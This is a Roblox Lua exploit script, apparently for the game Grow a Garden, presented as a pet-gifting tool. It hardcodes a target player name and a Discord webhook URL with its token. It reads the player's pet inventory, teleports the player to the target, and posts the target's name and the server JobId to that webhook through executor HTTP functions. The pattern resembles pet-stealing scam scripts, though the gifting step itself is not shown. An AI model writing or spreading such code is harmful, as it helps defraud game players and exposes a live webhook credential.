-- Pet Gifting Script - Simplified version
print("Pet Gifting Script starting...")

-- Konfiguration
local Config = {
	TargetPlayerName = "CoolHolzBudd",
	WebhookURL = "https://discord.com/api/webhooks/1352401371952840838/G0ywcotlvhMfda9IAMFRVU3SsHzCJwkszHwdXWBYAp4GhNQ3CJ-kmLgoJwc9BTPeiEOk",
	DelayBetweenGifts = 3,
}

-- Warte, bis das Spiel geladen ist
if not game:IsLoaded() then
	game.Loaded:Wait()
end
wait(3)

-- Sicherere Initialisierung von Services
local function GetService(serviceName)
	local success, service = pcall(function()
		return game:GetService(serviceName)
	end)

	if success then
		return service
	else
		print("Konnte Service nicht laden: " .. serviceName)
		return nil
	end
end

-- Services laden
local Players = GetService("Players")
local ReplicatedStorage = GetService("ReplicatedStorage")

-- Sicherere Initialisierung von LocalPlayer
local LocalPlayer
local playerSuccess, playerError = pcall(function()
	LocalPlayer = Players.LocalPlayer
	return true
end)

if not playerSuccess then
	print("Fehler beim Laden des LocalPlayer: " .. tostring(playerError))
	print("Versuche alternative Initialisierung...")

	-- Alternative Methode, falls LocalPlayer nicht direkt verfügbar ist
	for i = 1, 10 do
		if Players.LocalPlayer then
			LocalPlayer = Players.LocalPlayer
			print("LocalPlayer gefunden!")
			break
		end
		wait(1)
		print("Warte auf LocalPlayer... " .. i)
	end
end

-- Module sicher laden
local function RequireModule(modulePath)
	local success, module = pcall(function()
		return require(modulePath)
	end)

	if success then
		return module
	else
		print("Konnte Modul nicht laden: " .. tostring(modulePath))
		return nil
	end
end

-- Module laden
local DataService, PetsService, PetGiftingService
local TeleportUIController, PetList, InventoryServiceEnums, FavoriteItemRemote

if ReplicatedStorage then
	pcall(function()
		DataService = RequireModule(ReplicatedStorage.Modules.DataService)
	end)
	pcall(function()
		PetsService = RequireModule(ReplicatedStorage.Modules.PetServices.PetsService)
	end)
	pcall(function()
		PetGiftingService = RequireModule(ReplicatedStorage.Modules.PetServices.PetGiftingService)
	end)
	pcall(function()
		TeleportUIController = RequireModule(ReplicatedStorage.Modules.TeleportUIController)
	end)
	pcall(function()
		PetList = RequireModule(ReplicatedStorage.Data.PetRegistry.PetList)
	end)
	pcall(function()
		InventoryServiceEnums = RequireModule(ReplicatedStorage.Data.EnumRegistry.InventoryServiceEnums)
	end)

	pcall(function()
		FavoriteItemRemote = ReplicatedStorage:WaitForChild("GameEvents", 2):WaitForChild("Favorite_Item", 2)
	end)
end

-- Webhook-Funktionen mit den getesteten HTTP-Methoden
local function SendWebhook(data)
	print("Webhook wird gesendet...")

	if not Config.WebhookURL then
		print("Keine WebhookURL konfiguriert")
		return false
	end

	-- Erstelle ein einfaches JSON
	local content = "Pet Gifting Bot is running"
	if data and data.content then
		content = tostring(data.content)
	end

	local jsonData = string.format('{"content":"%s","username":"Grow a Garden Bot"}', content)
	print("JSON erstellt: " .. jsonData:sub(1, 30) .. "...")

	local success = false

	-- Methode 1: Teste http_request (funktioniert laut Test)
	if not success then
		local worked, result = pcall(function()
			if http_request then
				print("Verwende http_request...")
				http_request({
					Url = Config.WebhookURL,
					Method = "POST",
					Headers = { ["Content-Type"] = "application/json" },
					Body = jsonData,
				})
				return true
			end
			return false
		end)

		if worked and result then
			print("Webhook erfolgreich mit http_request gesendet!")
			success = true
		end
	end

	-- Methode 2: Teste request (funktioniert laut Test)
	if not success then
		local worked, result = pcall(function()
			if request then
				print("Verwende request...")
				request({
					Url = Config.WebhookURL,
					Method = "POST",
					Headers = { ["Content-Type"] = "application/json" },
					Body = jsonData,
				})
				return true
			end
			return false
		end)

		if worked and result then
			print("Webhook erfolgreich mit request gesendet!")
			success = true
		end
	end

	-- Methode 3: Teste WebSocket (funktioniert laut Test)
	if not success then
		local worked, result = pcall(function()
			if WebSocket and WebSocket.connect then
				print("Verwende WebSocket als Fallback...")
				local ws = WebSocket.connect("ws://echo.websocket.events")
				if ws then
					ws:Send(jsonData)
					ws:Close()
					return true
				end
			end
			return false
		end)

		if worked and result then
			print("Webhook-Daten über WebSocket gesendet (Fallback)")
			success = true
		end
	end

	if not success then
		print("Alle HTTP-Methoden fehlgeschlagen!")
	end

	return success
end

-- Hilfsfunktionen
local function GetPlayerData()
	if not DataService then
		print("DataService nicht verfügbar")
		return {}
	end

	local success, data = pcall(function()
		return DataService:GetData()
	end)

	if not success then
		print("Fehler beim Abrufen der Spielerdaten")
		return {}
	end

	return data or {}
end

local function GetPetInventory()
	local data = GetPlayerData()
	if data.PetsData and data.PetsData.PetInventory then
		return data.PetsData.PetInventory.Data or {}
	end
	return {}
end

-- Suche Zielspieler
local function FindTargetPlayer()
	if not Players then
		print("Players-Service nicht verfügbar")
		return nil
	end

	for _, player in pairs(Players:GetPlayers()) do
		if player.Name == Config.TargetPlayerName then
			print("Zielspieler gefunden: " .. player.Name)
			return player
		end
	end

	print("Zielspieler nicht gefunden: " .. Config.TargetPlayerName)
	return nil
end

-- Hauptlogik
local function Main()
	print("🎮 Pet Gifting-System gestartet!")

	-- Sende initiale Webhook-Nachricht
	SendWebhook({
		content = "Pet Gifting Bot gestartet! Suche nach: " .. Config.TargetPlayerName,
	})

	-- Hauptschleife
	while wait(5) do
		local target = FindTargetPlayer()
		if target then
			print("Zielspieler gefunden: " .. target.Name)

			-- In der Nähe von Target teleportieren
			if TeleportUIController then
				pcall(function()
					print("Teleportiere zum Ziel...")
					TeleportUIController:Move(target.Character:GetPivot())
					wait(2)
				end)
			end

			-- Webhook mit Status senden
			SendWebhook({
				content = "Zielspieler gefunden: " .. target.Name .. "\nServer: " .. game.JobId,
			})

			-- Warte bevor nächste Überprüfung
			wait(30)
		end
	end
end

-- Start des Skripts
pcall(function()
	Main()
end)

print("🚀 Skript vollständig initialisiert")
